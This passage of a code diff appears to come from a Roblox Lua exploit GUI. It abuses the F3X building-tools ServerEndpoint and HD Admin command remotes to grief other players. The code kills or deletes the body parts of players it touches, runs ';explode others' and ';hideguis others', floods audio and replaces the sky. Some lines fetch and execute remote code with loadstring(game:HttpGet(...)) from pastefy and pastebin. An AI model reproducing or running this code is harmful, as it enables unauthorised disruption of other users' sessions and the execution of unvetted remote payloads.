-			setanchor(pt,true)
-			setname(pt,"Seat")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-175.396240234375,50.59942626953125,-59.190975189208984),workspace)
-			resize(pt,Vector3.new(37.20752716064453,20,2.3819518089294434),CFrame.new(-175.396240234375,50.59942626953125,-59.190975189208984)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Plastic)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(17,17,17))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-192.20123291015625,50.274513244628906,-18.093753814697266),workspace)
-			resize(pt,Vector3.new(84.57750701904297,20,2.3819518089294434),CFrame.new(-192.20123291015625,50.274513244628906,-18.093753814697266)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Plastic)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(17,17,17))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-84.13870239257812,39.99934387207031,-33.93524169921875),workspace)
-			resize(pt,Vector3.new(157,1,248),CFrame.new(-84.13870239257812,39.99934387207031,-33.93524169921875)*CFrame.Angles(math.rad(0),math.rad(-90),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(163,162,165))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Spawn",CFrame.new(-82,40.99934387207031,-36),workspace)
-			resize(pt,Vector3.new(12,1,12),CFrame.new(-82,40.99934387207031,-36)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Plastic)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(163,162,165))
-			setanchor(pt,true)
-			setname(pt,"SpawnLocation")
-			createdecal(pt,Enum.NormalId.Top)
-			setdecal(pt,"110341159905873",Enum.NormalId.Top)
-			spawnRef = pt
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	
-	local t0=tick()
-	repeat wait(0.1) until done>=TOTAL or (tick()-t0)>90
-	wait(0.5)
-	local sp = spawnRef or workspace:FindFirstChild("SpawnLocation")
-	if sp then char:MoveTo(Vector3.new(sp.Position.X, sp.Position.Y+3, sp.Position.Z)) end
-	wait(0.3)
-	if errors==0 then print("[MAP] All 160 parts built!") else warn("[MAP] Done with "..errors.." errors") end
-	RequestCommand:InvokeServer(";respawn all")
-	RequestCommand:InvokeServer(";music 1846575559 , ;pitch 1.1 ;volume 1")
-	RequestCommand:InvokeServer(";R6 all")
-	RequestCommand:InvokeServer(";hideguis others")
+		loadstring(game:HttpGet("https://pastefy.app/SHpPnQOE/raw"))()
 	end)
 end;
 task.spawn(C_109);
@@ -23169,13 +20840,1212 @@ task.spawn(C_122);
 -- StarterGui.ScreenGui.FLUAframe.MorphsPage.ScrollingFrame.TextButton.LocalScript
 local function C_12c()
 local script = G2L["12c"];
-	local ReplicatedStorage = game:GetService("ReplicatedStorage")
-	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandModification
 	script.Parent.MouseButton1Up:Connect(function()
-		RequestCommand:InvokeServer(";btools")
-		RequestCommand:InvokeServer(";god")
-		loadstring(game:HttpGet('https://pastebin.com/raw/NVrEh3gu'))()
-			loadstring(game:HttpGet('https://pastebin.com/raw/CksD0uHs'))()
+		local Players = game:GetService("Players")
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local UserInputService = game:GetService("UserInputService")
+	
+		local player = Players.LocalPlayer
+		local chara = player.Character or player.CharacterAdded:Wait()
+		local humanoid = chara:WaitForChild("Humanoid")
+	
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandModification
+		local function cmd(c) 
+			pcall(function() RequestCommand:InvokeServer(c) end) 
+		end
+	
+		local swingAnim = Instance.new("Animation")
+		swingAnim.AnimationId = "rbxassetid://186934658"
+		local attackTrack = humanoid:LoadAnimation(swingAnim)
+	
+		local bladeActive = false
+		local scriptActive = true
+		local rightArm = chara:WaitForChild("Right Arm")
+	
+		local function stopScript()
+			scriptActive = false
+			if attackTrack and attackTrack.IsPlaying then
+				attackTrack:Stop()
+			end
+		end
+		cmd(";btools")
+		humanoid.Died:Connect(function()
+			stopScript()
+		end)
+	
+		rightArm.Touched:Connect(function(hit)
+			if not bladeActive or not scriptActive then return end
+			local targetChar = hit.Parent
+			local targetPlr = Players:GetPlayerFromCharacter(targetChar)
+			if targetPlr and targetPlr ~= player then
+				cmd(";kill " .. targetPlr.Name)
+			end
+		end)
+	
+		local function Teleport(pos)
+			local torso = chara:FindFirstChild("Torso") or chara:FindFirstChild("UpperTorso")
+			if torso then
+				torso.CFrame = CFrame.new(pos)
+			end
+	
+			local sound = Instance.new("Sound")
+			sound.SoundId = "rbxassetid://2767090"
+			sound.Looped = false
+			sound.Volume = 1
+			sound.Parent = workspace
+			sound:Play()
+	
+			sound.Ended:Connect(function()
+				sound:Destroy()
+			end)
+		end
+	
+		local function attack()
+			if not scriptActive or bladeActive then return end
+			bladeActive = true
+	
+			cmd(";sound 28144425")
+			cmd(";pitch 0.5")
+			cmd(";volume 10")
+	
+			local sound = Instance.new("Sound")
+			sound.Name = "HDAdminSound"
+			sound.SoundId = "rbxassetid://28144425"
+			sound.Looped = false
+			sound.Volume = 1
+			sound.Parent = workspace
+			sound:Play()
+	
+			sound.Ended:Connect(function()
+				cmd(";music 0")
+				sound:Destroy()
+			end)
+	
+			attackTrack:Play()
+			task.wait(0.75)
+			bladeActive = false
+		end
+	
+		local Mouse = player:GetMouse()
+		Mouse.KeyDown:Connect(function(key)
+			if key == "z" then
+				Teleport(Mouse.Hit.p + Vector3.new(0,2,0))
+			end
+		end)
+	
+		UserInputService.TouchTap:Connect(function(_, gp) if gp == false and scriptActive then attack() end end)
+		Mouse.Button1Down:Connect(function() if scriptActive then attack() end end)
+		
+	wait(1)
+	
+		function BurningEff(part)
+			local eff1 = Instance.new("ParticleEmitter",part)
+			eff1.Size = NumberSequence.new(.1)
+			eff1.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(.2,0),NumberSequenceKeypoint.new(1,1)})
+			eff1.LightEmission = 1
+			eff1.Lifetime = NumberRange.new(1)
+			eff1.Speed = NumberRange.new(0)
+			eff1.Rate = 100
+			eff1.Texture = "rbxassetid://347504241"
+			eff1.Acceleration = Vector3.new(0,10,0)
+			eff1.Color = ColorSequence.new(Color3.new(1,0,0))
+			local eff2 = Instance.new("ParticleEmitter",part)
+			eff2.Size = NumberSequence.new(.1)
+			eff2.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(.2,0),NumberSequenceKeypoint.new(1,1)})
+			eff2.LightEmission = 1
+			eff2.Lifetime = NumberRange.new(1)
+			eff2.Speed = NumberRange.new(0)
+			eff2.Rate = 100
+			eff2.Texture = "rbxassetid://347504259"
+			eff2.Acceleration = Vector3.new(0,10,0)
+			eff2.Color = ColorSequence.new(Color3.new(1,0,0))
+			local eff3 = Instance.new("ParticleEmitter",part)
+			eff3.Size = NumberSequence.new(1)
+			eff3.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(1,1)})
+			eff3.LightEmission = 1
+			eff3.Lifetime = NumberRange.new(1)
+			eff3.Speed = NumberRange.new(0)
+			eff3.Rate = 100
+			eff3.Texture = "rbxasset://textures/particles/fire_main.dds"
+			eff3.Acceleration = Vector3.new(0,10,0)
+			eff3.Color = ColorSequence.new(Color3.new(1,0,0))
+		end
+	
+	
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		for i,v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+	
+		remote = tool.SyncAPI.ServerEndpoint
+		function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+		blak=Color3.new(0,0,0)
+	
+		local function Color(part, color)
+			local args = {
+				"SyncColor",
+				{
+					{
+						Part = part,
+						Color = color,
+						UnionColoring = false
+					}
+				}
+			}
+			_(args)
+		end
+		function DestroyPart(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			_(args)
+		end
+		function MoveVector(part,vector)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Offset"] = vector
+					}
+				}
+			}
+			_(args)
+		end
+		function AddMesh(part)
+			local args = {
+				[1] = "CreateMeshes",
+				[2] = {
+					[1] = {
+						["Part"] = part
+					}
+				}
+			}
+			_(args)
+		end
+		function SetMesh(part,meshid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["MeshId"] = "rbxassetid://"..meshid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetTrans(part,int)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Transparency"] = int
+					}
+				}
+			}
+			_(args)
+		end
+		local function applyDecorationToPart(part) 
+			local argsCreate = {
+				[1] = "CreateDecorations",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["DecorationType"] = "Fire"
+					}
+				}
+			}
+			local argsSync = {
+				[1] = "SyncDecorate",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["DecorationType"] = "Fire",
+						["Size"] = 3,
+						["Heat"] = 25,
+						["Color"] = Color3.fromRGB(255, 0, 0), 
+						["SecondaryColor"] = Color3.fromRGB(255, 0, 0) 
+					} 
+				} 
+			}
+			_(argsCreate)
+			_(argsSync)
+		end
+	
+		function eyePart(part) 
+	
+			local argsCreate = {
+				[1] = "CreateDecorations",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["DecorationType"] = "Fire"
+					}
+				}
+			}
+			local argsSync = {
+				[1] = "SyncDecorate",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["DecorationType"] = "Fire",
+						["Size"] = 1,
+						["Heat"] = 12,
+						["Color"] = Color3.fromRGB(155, 0, 0), 
+						["SecondaryColor"] = Color3.fromRGB(255, 0, 0) 
+					} 
+				} 
+			}
+	
+			_(argsCreate)
+			_(argsSync)
+		end
+	
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	
+		local Players = game:GetService("Players")
+	
+		local UserInputService = game:GetService("UserInputService")
+	
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		--kill thingy
+		function thekille(target)
+			if target and target.Character then
+				for i,v in target.Character:GetDescendants() do
+					if v:IsA("BasePart") then
+						RequestCommand:InvokeServer(";paint "..target.Name.." black")
+						spawn(function()
+							Color(v,blak)
+						end)
+						spawn(function()
+							SetTrans(v,0.1)
+						end)
+						wait(0.5)
+						spawn(function()
+							SetTrans(v,0.2)
+						end)
+						wait(0.5)
+						spawn(function()
+							SetTrans(v,0.3)
+						end)
+						wait(0.5)
+						spawn(function()
+							SetTrans(v,0.4)
+						end)
+						wait(0.5)
+						spawn(function()
+							SetTrans(v,0.5)
+						end)
+						wait(0.5)
+						spawn(function()
+							SetTrans(v,0.6)
+						end)
+						wait(0.5)
+						spawn(function()
+							SetTrans(v,0.7)
+						end)
+						wait(0.5)
+						spawn(function()
+							SetTrans(v,0.8)
+						end)
+						wait(0.5)
+						spawn(function()
+							SetTrans(v,0.9)
+						end)
+						wait(0.5)
+						spawn(function()
+							SetTrans(v,1)
+						end)
+						wait(3)
+						spawn(function()
+							DestroyPart(v)
+						end)
+					end
+				end
+			end
+		end
+		wait(0.1)
+	
+		local kill = Instance.new("Sound",char)
+		kill.SoundId = "rbxassetid://28144425"
+		kill.Pitch = 0.6
+		kill.Volume = 3
+	
+		local at = kill:Clone()
+		at.SoundId="rbxassetid://82500396906354"
+		at.Parent = char
+		at.Volume = 0.5
+	
+		local player = Players.LocalPlayer
+		local character = char
+	
+	
+		RequestCommand:InvokeServer(";titlebk me á´Šá´ÊœÉ´ á´…á´á´‡")
+		RequestCommand:InvokeServer(";removeaccessories")
+		wait(1.5)
+		RequestCommand:InvokeServer(";hat me 18196403126")
+		wait(0.6)
+		RequestCommand:InvokeServer(";shirt me 100276101149100")
+		wait(0.9)
+		RequestCommand:InvokeServer(";pants me 109662040845019")
+		wait(0.5)
+		RequestCommand:InvokeServer(";head me 0")
+		wait(0.7)
+		RequestCommand:InvokeServer(";face me 144075659")
+		wait(0.3)
+		local eye = char:FindFirstChild("Accessory (JohnEye)").Handle
+		local arm = char:FindFirstChild("Right Arm")
+		local tor = char:FindFirstChild("Torso")
+		local ar2 = char:FindFirstChild("Left Arm")
+	
+		local RLeg = char:FindFirstChild("Right Leg")
+		local head = char:FindFirstChild("Head")
+		local LLeg = char:FindFirstChild("Left Leg")
+		task.spawn(function()
+			applyDecorationToPart(arm)
+		end)
+		task.spawn(function()
+			applyDecorationToPart(ar2)
+		end)
+		task.spawn(function()
+			eyePart(eye)
+		end)
+		RequestCommand:InvokeServer(";music 17717379222 ;pitch 0.2 ;volume inf")
+		task.spawn(function()
+			Color(arm, Color3.fromRGB(0,0,0))
+		end)
+		task.spawn(function()
+			Color(ar2, Color3.fromRGB(252, 255, 150))
+		end)
+		task.spawn(function()
+			Color(head, Color3.fromRGB(252, 255, 150))
+		end)
+		task.spawn(function()
+			Color(tor, Color3.fromRGB(255, 255, 0))
+		end)
+		task.spawn(function()
+			Color(RLeg, Color3.fromRGB(0, 200, 255))
+		end)
+		task.spawn(function()
+			Color(LLeg, Color3.fromRGB(0, 200, 255))
+		end)
+		task.spawn(function()
+			AddMesh(arm)
+		end)
+		task.spawn(function()
+			SetMesh(arm,"94818190090394")
+		end)
+		task.spawn(function()
+			MoveVector(arm,Vector3.new(0.37, -0.6, 0))
+		end)
+	
+		local arm = character:FindFirstChild("Right Arm") 
+		local humanoid = character:FindFirstChildOfClass("Humanoid")
+	
+		local isDead = false
+		humanoid.Died:Connect(function()
+			isDead = true
+		end)
+	
+		local animator = humanoid:FindFirstChildOfClass("Animator")
+	
+		local attackAnim = Instance.new("Animation")
+		attackAnim.AnimationId = "rbxassetid://186934658"
+		local attackTrack = animator:LoadAnimation(attackAnim)
+		function attack()
+			attackTrack:Play() 
+			local hitPlayer = nil
+			local touchedConnection
+	
+			local function onTouch(other)
+				local otherPlayer = Players:GetPlayerFromCharacter(other.Parent)
+				if otherPlayer and otherPlayer ~= player then
+					hitPlayer = otherPlayer
+				end
+			end
+	
+			touchedConnection = arm.Touched:Connect(onTouch)
+			task.wait(0.5)
+			if touchedConnection then
+				touchedConnection:Disconnect()
+			end
+			if hitPlayer then
+				d = at:Clone()
+				d:Play()
+				d.Parent = char
+				spawn(function()
+					wait(5)
+					d:Destroy()
+				end)
+				task.spawn(DestroyPart,hitPlayer.Character.Head)
+			else
+				d = kill:Clone()
+				d:Play()
+				d.Parent = char
+				wait(5)
+				d:Destroy()
+			end
+		end
+	
+	
+	
+	
+		UserInputService.TouchTap:Connect(function(input, gameProcessed)
+			if gameProcessed then return end
+	
+			if isDead then return end 
+			attack()
+		end)
+	
+	
+	
+		local backpack = player.Backpack
+	
+		local function getf3x()
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(char:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			return nil
+		end
+	
+		local f3x = getf3x()
+		if not f3x then
+			warn("you dont have f3x skid")
+		end
+	
+		local syncapi = f3x.SyncAPI
+		local serverendpoint = syncapi.ServerEndpoint
+		local function fire(part) 
+	
+			local argsCreate = {
+				[1] = "CreateDecorations",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["DecorationType"] = "Fire"
+					}
+				}
+			}
+	
+	
+			local argsSync = {
+				[1] = "SyncDecorate",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["DecorationType"] = "Fire",
+						["Size"] = 10,
+						["Heat"] = 0,
+						["Color"] = Color3.fromRGB(255, 0, 0), 
+						["SecondaryColor"] = Color3.fromRGB(255, 0, 0) 
+					} 
+				} 
+			}
+	
+	
+			_(argsCreate)
+			_(argsSync)
+		end
+		function delete(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			_(args)
+		end
+		function MovePart(part, cf)
+			local args = {
+				"SyncMove",
+				{
+					{
+						Part = part,
+						CFrame = cf
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function resize(part, size, cf)
+			local args = {
+				"SyncResize",
+				{
+					{
+						Part = part,
+						CFrame = cf,
+						Size = size
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function syncmaterial(part, mate)
+			local args = {
+				"SyncMaterial",
+				{
+					{
+						Part = part,
+						Material = mate
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function transparency(part, trans)
+			local args = {
+				"SyncMaterial",
+				{
+					{
+						Part = part,
+						Transparency = trans
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function color(part, color)
+			local args = {
+				"SyncColor",
+				{
+					{
+						Part = part,
+						Color = color,
+						UnionColoring = false
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function syncmeshid(part, id)
+			local args = {
+				"SyncMesh",
+				{
+					{
+						Part = part,
+						MeshId = "rbxassetid://" .. id
+					}
+				}
+			}
+			_(args)
+		end
+		function destroy(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			_(args)
+		end
+		local function makemesh(part)
+			local args = {
+				"CreateMeshes",
+				{
+					{
+						Part = part
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function syncmeshsize(part, vectora)
+			local args = {
+				"SyncMesh",
+				{
+					{
+						Part = part,
+						Scale = vectora
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function syncmeshtexture(part, id)
+			local args = {
+				"SyncMesh",
+				{
+					{
+						Part = part,
+						TextureId = "rbxassetid://" .. id
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function name(part, stringa)
+			local args = {
+				"SetName",
+				{ part },
+				stringa
+			}
+			_(args)
+		end
+	
+		local function lock(part, boolean)
+			local args = {
+				"SetLocked",
+				{ part },
+				boolean
+			}
+			_(args)
+		end
+	
+		local function setcollision(part, booleana)
+			local args = {
+				"SyncCollision",
+				{
+					{
+						Part = part,
+						CanCollide = booleana
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function setanchor(part, boolean)
+			local args = {
+				"SyncAnchor",
+				{
+					{
+						Part = part,
+						Anchored = boolean
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function createdecal(part, side)
+			local args = {
+				"CreateTextures",
+				{
+					{
+						Part = part,
+						Face = side,
+						TextureType = "Decal"
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function setdecal(part, asset, side)
+			local args = {
+				"SyncTexture",
+				{
+					{
+						Part = part,
+						Face = side,
+						TextureType = "Decal",
+						Texture = "rbxassetid://" .. asset
+					}
+				}
+			}
+			_(args)
+		end
+		task.spawn(function()
+			while task.wait(0.02) do
+				task.spawn(function()
+					local hrp = char.HumanoidRootPart
+					local pos = hrp.CFrame * CFrame.new(0, -3, 0)
+					local trail = serverendpoint:InvokeServer("CreatePart", "Normal", CFrame.new(0,0,0), char)
+					task.spawn(function()
+						setcollision(trail, false)
+					end)
+					task.spawn(function()
+						syncmaterial(trail, Enum.Material.Granite)
+					end)
+					task.spawn(function()
+						color(trail, Color3.new(0, 0, 0))
+					end)
+					task.spawn(function()
+						resize(trail, Vector3.new(10,0,10), pos)
+					end)
+					task.spawn(function()
+						fire(trail)
+					end)
+					BurningEff(trail)
+					task.wait(1)
+					delete(trail)
+				end)
+			end
+		end)
+	
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local rq = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+		local RunService = game:GetService("RunService")
+		local rotatetypeshii = Vector3.new(0, 1, 0).Unit
+		local skypartrotation = 0
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		for i,v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		--craaa
+		remote = tool.SyncAPI.ServerEndpoint
+		function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+		function SetCollision(part,boolean)
+			local args = {
+				[1] = "SyncCollision",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CanCollide"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function SetAnchor(boolean,part)
+			local args = {
+				[1] = "SyncAnchor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Anchored"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function CreatePart(cf,parent)
+			local args = {
+				[1] = "CreatePart",
+				[2] = "Normal",
+				[3] = cf,
+				[4] = parent
+			}
+			_(args)
+		end
+		function DestroyPart(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			_(args)
+		end
+		function MovePart(part,cf)
+			local args = {
+				[1] = "SyncMove",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf
+					}
+				}
+			}
+			_(args)
+		end
+		function Resize(part,size,cf)
+			local args = {
+				[1] = "SyncResize",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf,
+						["Size"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function AddMesh(part)
+			local args = {
+				[1] = "CreateMeshes",
+				[2] = {
+					[1] = {
+						["Part"] = part
+					}
+				}
+			}
+			_(args)
+		end
+		function reflect(part,int)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Reflectance"] = int
+					}
+				}
+			}
+			_(args)
+		end
+		function SetMesh(part,meshid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["MeshId"] = "rbxassetid://"..meshid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetTexture(part, texid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["TextureId"] = "rbxassetid://"..texid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetName(part, stringg)
+			local args = {
+				[1] = "SetName",
+				[2] = {
+					[1] = part
+				},
+				[3] = stringg
+			}
+	
+			_(args)
+		end
+		function MeshResize(part,size)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Scale"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function MeshColor(part,color)
+			local args = {
+				"SyncMesh",
+				{
+					{
+						Part = part,
+						VertexColor = color 
+					}
+				}
+			}
+			_(args)
+		end
+		function Weld(part1, part2,lead)
+			local args = {
+				[1] = "CreateWelds",
+				[2] = {
+					[1] = part1,
+					[2] = part2
+				},
+				[3] = lead
+			}
+			_(args)
+	
+		end
+		function SetLocked(part,boolean)
+			local args = {
+				[1] = "SetLocked",
+				[2] = {
+					[1] = part
+				},
+				[3] = boolean
+			}
+			_(args)
+		end
+	
+		function SetTrans(part,int)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Transparency"] = int
+					}
+				}
+			}
+			_(args)
+		end
+		function Setmate(part,int)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Material"] = int
+					}
+				}
+			}
+			_(args)
+		end
+		function CreateSpotlight(part)
+			local args = {
+				[1] = "CreateLights",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight"
+					}
+				}
+			}
+			_(args)
+		end
+		function SyncLighting(part,brightness)
+			local args = {
+				[1] = "SyncLighting",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight",
+						["Brightness"] = brightness
+					}
+				}
+			}
+			_(args)
+		end
+		function Color(part,color)
+			local args = {
+				[1] = "SyncColor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Color"] = color --[[Color3]],
+						["UnionColoring"] = false
+					}
+				}
+			}
+			_(args)
+		end
+		function SpawnDecal(part,side)
+			local args = {
+				[1] = "CreateTextures",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal"
+					}
+				}
+			}
+	
+			_(args)
+		end
+		function AddDecal(part,asset,side)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal",
+						["Texture"] = "rbxassetid://".. asset
+					}
+				}
+			}
+			_(args)
+		end
+		function ClonePart(part,parent)
+			local args = {
+				[1] = "Clone",
+				[2] = {
+					[1] = part
+				},
+				[3] = parent
+			}
+	
+			return remote:InvokeServer(unpack(args))
+		end
+		function Sky(id)
+			local ReplicatedStorage = game:GetService("ReplicatedStorage")
+			local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+	
+	
+			local function findBuildingTools()
+				local player = game:GetService("Players").LocalPlayer
+	
+				for _, item in ipairs(player.Character:GetChildren()) do
+					if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
+						return item
+					end
+				end
+	
+				for _, item in ipairs(player.Backpack:GetChildren()) do
+					if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
+						return item
+					end
+				end
+	
+				return nil
+			end
+	
+			local buildingTools = findBuildingTools()
+			if not buildingTools then
+				warn("btools not found")
+				return
+			end
+	
+			local syncAPI        = buildingTools:FindFirstChild("SyncAPI")
+			local serverEndpoint = syncAPI and syncAPI:FindFirstChild("ServerEndpoint")
+	
+			if not serverEndpoint then
+				warn("btools not found")
+				return
+			end
+	
+			local skyInstance = workspace.Terrain:FindFirstChild("Sky") or workspace:FindFirstChild("Sky")
+			if not skyInstance then
+	
+				print"ok"
+			end
+			spawn(function()
+				DestroyPart(skyInstance)
+			end)
+			local success, result
+			if serverEndpoint:IsA("RemoteFunction") then
+				success, result = pcall(function()
+					return serverEndpoint:InvokeServer(unpack(args))
+				end)
+			else
+	
+				serverEndpoint:FireServer(unpack(args))
+				success = true
+			end
+	
+			if success then
+	
+				print"yay"
+	
+			end
+			e = char.HumanoidRootPart.CFrame.x
+			f = char.HumanoidRootPart.CFrame.y
+			g = char.HumanoidRootPart.CFrame.z
+			mhm = CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,-5,0)
+			v = remote:InvokeServer("CreatePart","Normal",mhm,char)
+			task.spawn(function()
+				SetName(v,"johnbeep")
+			end)
+			task.spawn(function()
+				AddMesh(v)
+			end)
+			task.spawn(function()
+				rq:InvokeServer(";time 0")
+			end)
+			task.spawn(function()
+				Resize(v,Vector3.new(0,0,0),v.CFrame)
+			end)
+			task.spawn(function()
+				SetMesh(v,"1527559")
+			end)
+			task.spawn(function()
+				MeshColor(v,vector.create(2,0,0))
+			end)
+			task.spawn(function()
+				SetTexture(v,id)
+			end)
+			task.spawn(function()
+				MeshResize(v,Vector3.new(-3000,-1000,-3000))
+			end)
+			task.spawn(function()
+				SetLocked(v,true)
+			end)
+	
+			local rotationAngle = 5
+			local rotationSpeed = math.rad(20)
+			RunService.Heartbeat:Connect(function(deltaTime)
+				rotationAngle = rotationAngle + rotationSpeed * deltaTime
+				local rotation = CFrame.Angles(0, rotationAngle, 0)
+				local cf = CFrame.new(v.Position) * rotation
+	
+				task.spawn(function()
+					MovePart(v, cf)
+				end)
+			end)
+	
+		end
+		Sky("1529455")
+	
+		while true do
+			wait(0.1)
+			if character:FindFirstChildOfClass("Humanoid").Health <= 0 then
+				RequestCommand:InvokeServer(";titler me BAD CHOICE")
+	
+				ClonePart(character.Head,workspace.Terrain)
+				wait(0.1)
+				local bg = workspace.Terrain.Head
+				task.spawn(function()
+					DestroyPart(bg.face)
+				end)
+				task.spawn(function()
+					SetTrans(bg,1)
+				end)
+				ClonePart(character.johnbeep,workspace.Terrain)
+				spawn(function()
+					MeshColor(workspace.Terrain.johnbeep,vector.create(0,0,0))
+				end)
+				task.spawn(function()
+					MeshResize(workspace.Terrain.johnbeep,Vector3.new(-50000,-50000,-50000))
+				end)
+				RequestCommand:InvokeServer(";explode others")
+				RequestCommand:InvokeServer(";music 17717379222")
+				RequestCommand:InvokeServer(";volume 10")
+				wait(4)
+				RequestCommand:InvokeServer(";music 19094700")
+				RequestCommand:InvokeServer(";pitch 0.5")
+				RequestCommand:InvokeServer(";volume 3")
+				wait(0.8)
+				RequestCommand:InvokeServer(";fogcolor black")
